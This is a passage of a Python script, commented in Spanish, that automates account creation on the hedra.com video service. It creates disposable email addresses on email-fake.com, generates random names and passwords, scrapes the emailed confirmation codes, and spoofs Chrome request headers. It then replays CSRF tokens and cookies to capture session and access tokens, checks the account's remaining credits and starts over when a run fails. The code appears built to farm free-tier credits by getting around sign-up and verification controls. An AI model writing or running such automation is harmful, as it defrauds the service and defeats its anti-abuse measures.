        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "Content-Type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://www.hedra.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/sign-up",
        "Accept-Language": "es-ES,es;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": cookies  # Incluir las cookies proporcionadas manualmente
    }
    
    # Datos a enviar en la solicitud POST
    data = {
        "email": email,
        "code": code,
        "action": "CONFIRM",
        "redirect": "false",
        "csrfToken": csrf_token,
        "callbackUrl": "https://www.hedra.com/sign-up",
        "json": "true"
    }
    
    try:
        # Realizar la solicitud POST
        print(f"\r⏱️ Processing..", end='', flush=True)
        response = requests.post(url, headers=headers, data=data)
        
        # Verificar si la solicitud fue exitosa
        if response.status_code == 200:
            print(f"\r⏱️ Processing...", end='', flush=True)
            
            # Extraer la cookie __Secure-next-auth.session-token
            session_token = None
            for cookie in response.cookies:
                if cookie.name == "__Secure-next-auth.session-token":
                    session_token = cookie.value
                    print(f"\r⏱️ Processing.", end='', flush=True)
                    break
            
            if not session_token:
                print("No se encontró la cookie __Secure-next-auth.session-token.")
            
            # Manejar la respuesta (JSON o binaria)
            try:
                # Intentar decodificar la respuesta como JSON
                json_response = response.json()
                #print("Respuesta JSON:", json_response)
                if session_token:
                  os.environ["SESSION_TOKEN"] = session_token
                  return session_token, json_response
                else:
                  return None, json_response
            except ValueError:
                # Si no es JSON, manejar la respuesta binaria
                binary_response = response.content
                print("Respuesta binaria recibida:", binary_response)
                return session_token, binary_response
        
        else:
            print(f"\r⏱️ Error en la solicitud..", end='', flush=True)
            return None, None
    
    except Exception as e:
        print(f"Ocurrió un error: {e}")
        return None, None

def execute_get_request(usuario, dominios):
    url = "https://email-fake.com/"
    headers = {
        "Host": "email-fake.com",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cookie": f'surl={dominios}%2F{usuario}',
        "Accept-Encoding": "gzip, deflate"
    }

    response = requests.get(url, headers=headers)

    # Uso de la función
    internal_code, oob_code = extract_codes_from_html(response.text)

    #print(response.text)

    # Extraer el código de verificación del contenido HTML
    verification_code = extract_verification_code(response.text)

    #if verification_code=="No Exit":
    #  proceso_completo()

    # Definir el patrón de búsqueda para delll
    patron = r"delll:\s*\"([^\"]+)\""

    # Aplicar la búsqueda utilizando regex
    resultado = re.search(patron, response.text)

    # Verificar si se encontró delll y obtener su valor
    if resultado:
        valor_delll = resultado.group(1)

    else:
        print(f"\r❌ -8 Error getting status...", end='', flush=True)


    return internal_code, str(verification_code).replace("Your confirmation code is ",""), valor_delll

def procesando(checkpoints):
    if checkpoints == 0:
        print(f"\r⏱️ Processing.", end='', flush=True)
        return False  
    elif checkpoints > 0:
        print(f"\r⏱️ Processing..", end='', flush=True)
        return True  
    else:
        print(f"\r⏱️ Processing...", end='', flush=True)
        return False  


def obtener_creditos(authorization):
    # URL del endpoint
    url = "https://api.hedra.com/web-app/billing/credits"
    
    # Encabezados por defecto
    headers = {
        "authorization": f"Bearer {authorization}",
        "accept": "application/json",
        "content-type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "ssr": "False",
        "sec-ch-ua-platform": "Windows",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        "sec-ch-ua-mobile": "?0",
        "enable-canary": "False",
        "access-control-allow-origin": "http://localhost:3000",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/",
        "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate"
    }
    
    try:

        response = requests.get(url, headers=headers)
        
        # Verificar si la respuesta fue exitosa
        if response.status_code == 200:
            data = response.json()
            
            # Extraer el valor de "remaining"
            remaining = data.get("remaining")
            if remaining is not None:
                print(f"\r⏱️ Processing..", end='', flush=True)
                os.environ["SINGLE"] = str(remaining)
                return remaining
            else:
                print(f"\r❌ -9 Error getting status...", end='', flush=True)
                return None
        else:
            print(f"\r❌ -10 Error getting status...", end='', flush=True)
            return None
    
    except Exception as e:
        print(f"\r❌ -11 Error getting status...", end='', flush=True)
        return None


def configs():
    process = get_user()
    if process:
        os.environ["PRO"] = process
        print(f"\r⏱️ Processing.", end='', flush=True)
        message, checkpoints, istm = geo_tmap(process, "Hunyuan", "480p")
        if procesando(checkpoints):
            print(f"\r⏱️ Processing...", end='', flush=True)
            if message == "User registered":
              print(f"\r⏱️ Processing..", end='', flush=True)
              os.environ["CHECKPOITS"] = str(checkpoints)
              proceso_completo()
            else:
              print(f"\r⏱️ Processing.", end='', flush=True)
              os.environ["CHECKPOITS"] = str(checkpoints)
              proceso_completo()
 
def config():
    process = get_user()
    if process:
        os.environ["PRO"] = process
        print(f"\r⏱️ Processing.", end='', flush=True)
        message, checkpoints, istm = geo_tmap(process, "Hunyuan", "480p")
        if procesando(checkpoints):
            if message == "User registered":
              print(f"\r⏱️ Processing..", end='', flush=True)
              os.environ["CHECKPOITS"] = str(checkpoints)
            
def proceso_completo():
    configurar_credenciales()
    email = os.environ.get("EMAIL_AIVIS")
    passwords = os.environ.get("PASS_AIVIS")
    time.sleep(1)
    # Paso 2: Obtener información de la sesión
    print(f"\r⏱️ Processing.", end='', flush=True)
    csrf_token, formatted_cookies = obtener_csrf_token_con_cookies()
    os.environ["CSRF_TOKEN"] = csrf_token
    os.environ["FORMATTED_COOKIE"] = formatted_cookies
    time.sleep(5)

    # Paso 3: Postear credenciales y obtener token de sesión
    print(f"\r⏱️ Processing.", end='', flush=True)
    session_token = iniciar_sesion_con_cookies(email, passwords, csrf_token, formatted_cookies)
    if session_token:
        os.environ["SESSION_TOKEN"] = session_token
        print(f"\r⏱️ Processing..", end='', flush=True)
        usuario = os.environ.get("USER_AIVIS")
        dominio = os.environ.get("DOMAIN_AIVIS")
        time.sleep(5)
        # Paso 4: Buscar código interno
        print(f"\r⏱️ Processing...", end='', flush=True)
        internal_code, oob_code, valor_delll = execute_get_request(usuario, dominio)

        

        # Paso 5: Verificar credenciales con el código
        print(f"\r⏱️ Processing.", end='', flush=True)

        time.sleep(5)

        session_token, response_data = enviar_codigo_confirmacion(email, oob_code, csrf_token, session_token, formatted_cookies)
    
        if session_token and response_data:
            print(f"\r⏱️ Processing..", end='', flush=True)
  
            time.sleep(3)
            session_token_0, session_token_1, response_data = iniciar_sesion(email, passwords, csrf_token, session_token, formatted_cookies)
    
            if session_token_0 or session_token_1 or response_data:
                print(f"\r⏱️ Processing...", end='', flush=True)
                time.sleep(3)
                # Obtener la sesión
                session_token_0, session_token_1, access_token = obtener_sesion(formatted_cookies, session_token_0, session_token_1)
                
                if session_token_0 or session_token_1 or access_token:
                    #print("Cookies específicas recibidas:")
                    if access_token:
                        os.environ["ACCESS_TOKEN_AIVIS"] = access_token
                        print(f"\r⏱️ Processing.", end='', flush=True)
                        enviar_dell_post(valor_delll, usuario, dominio)
                        print("\n🔄 Connect.")
                    
                else:
                    print(f"\r⏱️ No se pudo obtener las cookies específicas o la respuesta..", end='', flush=True)
                    configs()


            else:
                print("No se pudo obtener las cookies específicas o la respuesta.")
                configs()

        else:
            print(f"\r⏱️ No se pudo obtener la cookie o la respuesta.", end='', flush=True)
            configs()

    else:
        print(f"\r⏱️ No se pudo obtener la cookie o la respuesta.", end='', flush=True)
        configs()

def configurar_credenciales():
    print(f"\r⏱️ Processing...", end='', flush=True)
    
    password_segug = generar_contrasena()
    response = enviar_formulario()
    sitio_domain = obtener_sitio_web_aleatorio(response.text)
    
    nombre_completo = generar_nombre_completo()
    email = f'{nombre_completo}@{sitio_domain}'
    passwords = password_segug

    usuario, dominio = email.split('@')

    os.environ["USER_AIVIS"] = usuario
    os.environ["DOMAIN_AIVIS"] = dominio

    os.environ["EMAIL_AIVIS"] = email
    os.environ["PASS_AIVIS"] = passwords
